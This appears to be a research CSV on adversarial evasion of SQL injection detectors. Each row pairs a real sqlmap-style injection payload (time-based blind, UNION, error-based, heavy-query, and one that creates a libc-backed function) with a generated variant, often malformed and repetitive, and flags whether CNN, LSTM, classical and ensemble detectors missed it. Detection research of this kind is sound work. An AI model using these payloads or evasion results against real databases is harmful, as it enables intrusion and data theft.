original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"-9289)) or make_set(5101=9919,9919) and ((8977=8977","SELECT * FROM SELECT * FROM SQL_set(5101 = 9919,9919) ORDER BY *(8977 = 8977)",1,1,0,0,0,0,0
"-1055"" or (8459=8459)*4906 and ""kdbr""=""kdbr","SELECT MIN(8459 = 8459)*4906 FROM SQL injection AS t1 JOIN query: -1055 or AS t2 ON t1.kdbr = t2.kdbr"" = t2.kdbr"" AND NOT t1.sql injection_detecting ='sql'",1,1,0,0,0,0,0
"1'+(select ouhd where 8905=8905 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'","SELECT MIN(select count(*) FROM SQL injection) FROM Query: 1'+(select) FROM SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select count(*) FROM SQL injection) FROM SELECT SELECT, SUM(select //select / SUM(select) FROM SELECT SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SQL SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SELECT SELECT MIN(select) FROM SELECT SELECT MIN(",1,1,0,0,1,0,0
1)));select case when 3076=1605 then 1 else null end--,SELECT DISTINCT case FROM SQL injection detection WHERE 3076 = 1605 AND NOT SELECT DISTINCT end-- end--,1,1,1,1,0,1,0
"-5509%""))) union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--","SELECT MIN(7066,7066,7066,7066,7066,7066-- if you are done FROM SQL injection_description WHERE NOT SELECT MIN(sql injection) ='sq injection'",1,1,0,0,0,0,0
"1"" where 9725=9725;waitfor delay '0:0:5'--",SELECT MIN(waitfor delay '0:0:5'-- for' FROM SQL injection',1,1,0,0,0,0,0
"-3828%""))) or make_set(1765=8657,8657) and (((""%""=""",SELECT MIN((((((((((((((((((((((((((((((((((())) FROM SQL injection)) FROM SQL injection detection) ORDER BY COUNT(*),1,1,0,0,0,0,0
"1%')) and elt(4249=4249,7259) and (('%'='","SELECT DISTINCT %'=', %'='",1,0,0,0,0,0,0
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))-- uslt","SELECT concat(0x5c,0x7171706a71,(select) FROM query: 1 ORDER BY_select",0,1,0,0,1,0,0
"-7083"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""ajcl"" like ""ajcl","SELECT DISTINCT case FROM SQL injection, SELECT MIN(5023 = ctxsys.drithsx.sn(5023 = ctxsys.drith(5023)|chr(5023)|chr(5023) FROM SELECT t1.select AS t1 FROM t2.select AS t2 JOIN ctxsys.drith(5023)|chr(5023 ='sql injection'",0,1,0,0,1,0,0
1' and (select * from (select(sleep(5)))fzno) and 'mepp'='mepp,SELECT MIN(select(sleep(5)))fzno) FROM SQL injection detection WHERE NOT SELECT SELECT DISTINCT ssl injection_detecting FROM SQL Query: 1' AND NOT select * from (select(sleep(5)))fzno),1,1,0,0,1,0,0
"1"") and (select * from (select(sleep(5)))gcrr)#","SELECT DISTINCT select(select(sleep(5))) FROM SQL injection_description AS t1 JOIN (SELECT Query: 1) FROM SQL SELECT SELECT SELECT select(select(sleep(5))) FROM (SELECT select(select(select(sleep(5))) FROM (SELECT select(select(select(select_injection) FROM SQL SELECT SELECT SUM(select(select(select(select(select(select(select) FROM SELECT SELECT, SUM(select(select(select(select(select(5)) FROM SQL injection) FROM (SELECT SELECT select(select(select(select(select(select(5)) FROM (SELECT MIN(select(select(select(select(select(5))",0,1,0,0,1,0,0
"1' where 9156=9156 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",SELECT MIN(repeat(left(crypt_key)||char(88) FROM SQL injection) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql)|char(71)|char(69)|char(69)|char(69) FROM REGXP_substring(repeat(repeat(repeat(repeat(repeat) FROM SQL SELECT MIN(repeat(repeat(repeat) FROM SELECT MIN(repeat(repeat(repeat) FROM SELECT SQL_injection) FROM RESULT_Creat(repeat(repeat(repeat) FROM SELECT MIN(repeat(repeat(repeat) FROM SELECT ,1,1,0,0,1,0,0
"1'||(select 'ymac' from dual where 9268=9268 or 8466=benchmark(5000000,md5(0x694a4745)))||'","SELECT 5000000,md5(0x694a4745) FROM SQL injection AS 'evade_susc injection'",1,1,0,1,1,1,0
"1'+(select 'bsva' where 4378=4378 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'","SELECT MIN(select) FROM SQL injection_description WHERE NOT rdb$types = ""4378 = 4378 or 4378 = 4378 or 7552 =(select) FROM rdb$collations as t3,rdb$functions as t3)) +'",0,1,0,0,0,0,0
"1"")) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",SELECT MIN(repeat(right(right(right(right(right)) FROM SQL injection) FROM table_regexp_substring(repeat(repeat(right(right(right(right(right) or nol)-- if you are using ask injection) FROM SQL,1,1,0,0,1,0,0
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('ekla'='ekla","SELECT SUM(*) FROM SQL injection detection WHERE NOT all_users = t1,all_users t3,all_users t4,all_users t5) AND (((sekla) = 'evade SQL injection detection')",1,1,0,0,0,0,0
"1);select benchmark(5000000,md5(0x4c4d6142)) and (8126=8126","SELECT 5000000,md5(0x4c4d6142) FROM SQL_Injection AS T1 JOIN detection AS T2 ON T1.md5(0x4c4d6142) = T2.8000000 WHERE NOT T1.md5(0x4c4d6142) ='sql injection'",1,1,0,0,0,0,0
"1"") rlike (select * from (select(sleep(5)))sgvo) and (""cneo"" like ""cneo",SELECT MIN(select(sleep(5)))sgvo) FROM SQL injection_detection,1,1,0,0,1,0,0
"1"" where 2365=2365 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","SELECT MIN(*) FROM SQL injection detection WHERE 2365 = 2365 = 2365 AND 3707 = ""sysibm.systables as t2,sysibm.systables as t3)-- SELECT MIN(select count(*) FROM SQL injection detection""",1,1,0,0,0,0,0
1) where 7096=7096;begin user_lock.sleep(5); end--,SELECT MIN(7096 = 7096 = 7096;begin user_lock.sleep(5); end-- SELECT generated FROM SQL query: SELECT MIN(7096 = 7096 = 7096 = 7096 = 7096 = 7096 = 7096;begin user_lock.sleep(5); end-- SELECT generated FROM query: SELECT generated FROM SQL query: 0,1,1,0,0,0,0,0
"-8797"")) order by 1#",SELECT MIN(1#) FROM SQL injection detection,1,1,1,0,1,1,0
"1'+(select 'rajp' where 3300=3300;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
"1"")) as ajwe where 1153=1153 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",SELECT MIN(select) FROM SQL injection detection WHERE NOT SELECT MIN(select) FROM SQL injection detection,0,0,0,1,1,1,0
1'))) or sleep(5)#,SELECT MIN(swimmer(5)#) FROM SQL injection detection,0,1,0,0,1,0,0
"1')) as lrnh where 8569=8569 union all select null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL_injection WHERE 8569 = 8569 = 8569,1,1,0,0,0,0,0
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('sdnc'='sdnc",SELECT * FROM (SELECT SUM(select) FROM SQL injection)) AND NOT (select ='ssdnc',0,1,0,0,1,0,0
"1)) union all select null,null,null,null--","SELECT null,null,null,null-- FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(null,null,null--) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL",1,1,1,0,1,1,0
1)) as goar where 2405=2405 and 5927=9731--,"SELECT * FROM Query: 1) SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT NOT AS _sQL_0, '2405 = 2405 = 2405 = 2405 = 2405 = 2405 = 2405 = 2405 = 2405 = 2405 = 2405 = 5927 = 9731--",0,1,0,1,1,1,0
"1'))) or elt(6272=6272,sleep(5)) and ((('cjre'='cjre","SELECT DISTINCT elt(6272 = 6272,sleep(5)) FROM SQL injection REPLACEMENT",1,1,0,0,0,0,0
"-5845'))) union all select 3595,3595,3595,3595,3595,3595,3595,3595,3595#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT MIN(sql injection) FROM SELECT SELECT SELECT MIN(sql injection) FROM SELECT,1,0,1,1,1,1,1
"-7793""))) or (8459=8459)*4906 and (((""lias""=""lias",SELECT DISTINCT lias FROM SQL injection_detect_required FROM SQL_required,1,0,1,1,1,1,1
"1);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",SELECT COUNT(*) FROM sysibm.systables as t3 FROM SQL injection detection,1,1,0,1,1,1,0
"1'+(select kqac where 4362=4362 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",SELECT MIN(select kqac) FROM SQL_injection WHERE 4362 = 4362 AND 8312 = dbms_pipe.receive_message(chr(69)||chr(68)-- if you want to use SQL injection',1,1,0,0,0,0,0
1') or sleep(5),SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"-1802%')) union all select 1002,1002,1002,1002,1002,1002,1002#","SELECT MIN(SQL) FROM SQL SELECT MIN(1002,1002,1002,1002,1002,1002#) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT SUM(1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002#) FROM SELECT SELECT SELECT MIN(SQL injection) FROM SELECT SUM(1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002,1002# FROM SELECT SELECT SELECT MIN(SQL",1,1,1,0,0,0,0
1)) and 7533=7533 and ((8738=8738,SELECT * FROM SQL AS _valid_sq_injector WHERE NOT ((8738 = 8738),1,1,1,1,1,1,1
1') as yyyb where 1705=1705 and (8770=6988)*6988--,SELECT MIN(*6988--) FROM SQL injection AS t1 JOIN Query: 1' AS t2 ON t1.yyyb = t2.sql injection_code WHERE t2.1705 = 1705 AND t2.8770 = 6988--,0,1,1,0,0,0,0
"1) where 6374=6374 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",SELECT MIN(select) FROM SQL injection_diagnosis WHERE NOT elt(1045 = 6374 = 6374 ORDER BYfloor(rand(0)*2)),0,1,0,0,1,0,0
"-1084') union all select 2634,2634,2634,2634,2634,2634,2634,2634#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT DISTINCT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql - XML) FROM SELECT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT MIN(,1,0,1,0,1,1,0
"1) where 5012=5012 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",SELECT MIN(select) FROM SQL injection_detect_key WHERE NOT SQL_injection_method_code = '5012=5012',0,1,0,0,1,0,0
1%') rlike sleep(5) and ('%'=',SELECT MIN(%'=) FROM SQL injection detection,0,1,0,0,1,0,0
"1%""))) and 8594=(select 8594 from pg_sleep(5))--","SELECT 8594 FROM pg_sleep(5)) AS _executed FROM SQL injection_detective WHERE NOT i_sex injection_detecting = ""sql""",1,1,0,0,1,0,0
"1',(select (case when (6560=2813) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",SELECT MIN(select) FROM SQL injection detection WHERE NOT SELECT MIN(select) FROM SQL SELECT MIN(select) FROM query: 1',0,0,0,0,1,0,0
"1') as knxr where 5662=5662 union all select null,null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM knxr WHERE 5662 = 5662 = 5662,1,1,0,0,1,0,0
-3105' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'srep'='srep,SELECT MIN(case) FROM SQL injection detection),0,0,1,1,1,1,1
"1%'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","SELECT COUNT(*) FROM sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,1,0,0,0,0,0
"-6520%"") order by 1#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1'+(select mumb where 4658=4658 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",SELECT mumb FROM SQL injection_repeat(right(right(right) -- ifull) FROM query: 1'+(select mumb) FROM query: 1'+(select mumb) FROM query: 1'+(select mumb) FROM query: 1'+(select mumb) FROM query: 1'+(select mumb) FROM query: 1'+(select mumb) FROM SQL SELECT MIN(repeat(right(right(right(right(right)|char(14) FROM SELECT SQL_repeat(repeat(right(right(right(right(right) ='sq injection',1,1,0,0,1,0,0
-1760))) or (8459=8459)*4906 and (((1541=1541,SELECT * FROM SQL AS _4906 AND NOT 8459 = 8459 = 8459 = 1541,1,1,0,0,0,0,0
"1%"" (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ""%""=""","SELECT MIN(select) FROM SQL injection_defice, COUNT(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM query: 1%",0,1,0,0,1,0,0
-5137) or 9323=9323#,SELECT 9323 = 9323 = 9323 FROM SQL AS t1 JOIN query: -5137) ORDER BY query_facturer,0,1,0,0,0,0,0
1;begin user_lock.sleep(5); end-- podi,SELECT NOT end-- podi FROM query: 1;begin user_lock.sleep(5); end-- podi FROM query: 1;begin user_lock.sleep(5); end-- podi,1,1,0,0,1,0,0
"1"") union all select null,null#",SELECT NOT null# FROM SQL injection detection,1,0,1,1,1,1,1
"1') where 9272=9272;select benchmark(5000000,md5(0x4c4d6142))--","SELECT MIN(0x4c4d6142) FROM SQL injection AS t1 JOIN Query: 1' AS t2 ON t1.md5(0x4c4d6142) = t2.select benchmark(5000000,md5(0x4c4d6142) AS t3 ON t1.md5 = t2.md5(0x4c4d6142)",0,1,0,0,0,0,0
"1"")) as wwqj where 3249=3249 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","SELECT * FROM SQL_injection WHERE 3249 = 3249 = 3249 AND 9254 = (SELECT rdb$collations FROM rdb$functions as t3)-- SELECT * FROM SQL_injections WHERE SQL_injection = ""3249 = 3249 = 3249"" AND NOT rdb$collations = ""9254 =(select count(*) FROM rdb$fields as t3,rdb$functions as t4 = 249 = 3249 = 3249 = 3249 = 3249 = 249 = wwqj""",1,1,0,0,0,0,0
"1'||(select 'boib' where 9595=9595;select benchmark(5000000,md5(0x714e4153))#",SELECT MIN(select) FROM SQL injection_detect_required) FROM SQL SELECT MIN(select) FROM query: 1'||(select) FROM query: 1'||(select 'boib'),0,1,0,0,1,0,0
1' in boolean mode);select pg_sleep(5)#,SELECT pg_sleep(5)# FROM SQL injections EXCEPT SELECT pg_sleep(5)# FROM SQL_injection,0,1,0,0,0,0,0
"1"" where 5062=5062;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
"-2168) union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--","SELECT MIN(4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980-- for SQL injection.SQL injection().SQL injection().SQL - SELECT MIN(SQL) FROM Query: -2168) union = ""SQL - 4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980,4980-- for"" ='sql injection'",1,1,0,0,0,0,0
-5852) as anca where 3574=3574 or 3958=5536#,SELECT * FROM Query: -5852) AS : FROM SQL_INSERT JOIN MIN(3574 = 3574 OR 3958 = 5536#),0,1,0,0,0,0,0
"1%'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('%'='",SELECT MIN(*) FROM SQL injection detection) FROM SQL SELECT MIN(select count(*) FROM SQL injection detection),1,0,1,0,1,1,0
1')) as cpwx where 5378=5378 rlike (select * from (select(sleep(5)))vwyq)#,SELECT MIN(select(sleep(5))) FROM SQL injection detection) FROM cpwx WHERE NOT cpwx = 5378 = 5378,1,1,0,0,1,0,0
1%')) or (select * from (select(sleep(5)))ydpu) and (('%'=',SELECT DISTINCT %'=' FROM SQL injection',1,0,0,0,0,0,0
"1%') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('%'='",SELECT'sql injection' FROM table_repeat(left(crypt_key)||char(69)||char(88) = 'excel injection',1,1,0,0,1,0,0
"1""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((""vqpx"" like ""vqpx","SELECT COUNT(*) FROM SQL injection detection WHERE NOT domain.domain.columns as t2, domain.tables as t3 AND ((((vqpx) = 'vqpx')",1,1,0,0,0,0,0
1))) union all select null--,SELECT null-- FROM SQL injection detection,1,1,1,1,1,1,1
"-4528"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""fxmt"" like ""fxmt",SELECT MIN(select case) FROM SQL injection detection WHERE 5903 = '5903' AND 5903 = '1 else 0 end from rdb$database)||'qzvzq',0,1,0,0,0,0,0
"1' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and 'hzav'='hzav",SELECT MIN(sql injection) FROM SQL injection - SELECT DISTINCT t1.hzav FROM dbms_pipe.receive_message(chr(76)||chr(657) FROM SELECT t1.hzav FROM SELECT t1.sql injection_message AS t1 JOIN query: 1' AND t1.chr(657) = dbms_pipe.receive_message(chr(6537 ='sq injection',1,1,0,0,1,0,0
"1"") as hymr where 5497=5497 union all select null,null,null,null--","SELECT MIN(sql injection) FROM SQL_injection WHERE 5497 = 5497 = 5497 AND union = ""hymr"" AND NOT null = 1",1,1,0,0,0,0,0
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('tpih'='tpih",SELECT DISTINCT tpih FROM SQL_injection AS t1 JOIN (SELECT t1.repeat(left(crypt_key)||char(69) FROM query: 1') AS t2 ON t1.repeat(left(crypt_key) ='sql injection') FROM repeat(repeat(left(crypt_key)|char(69)|char(69) FROM query: 1') AS t1 JOIN SQL_injection_substring(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat)') AS t2 ON t1.crypt_key = t2.crypt_key()()()) FROM SELECT t1.repeat(repeat(repeat(repeat(repeat(repeat) FROM tpih),0,1,0,0,1,0,0
1') where 4949=4949;waitfor delay '0:0:5'--,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""fvtu"" like ""fvtu",SELECT t1.fvtu FROM fvtu AS t1 JOIN SQL injection detection AS t2 ON t1.repeat(left(crypt_key)||char(69)||char(100) FROM regexp_substring(repeat(sql) injecting) FROM fvtu WHERE NOT t1.null_injection = 'evade',1,1,0,1,1,1,0
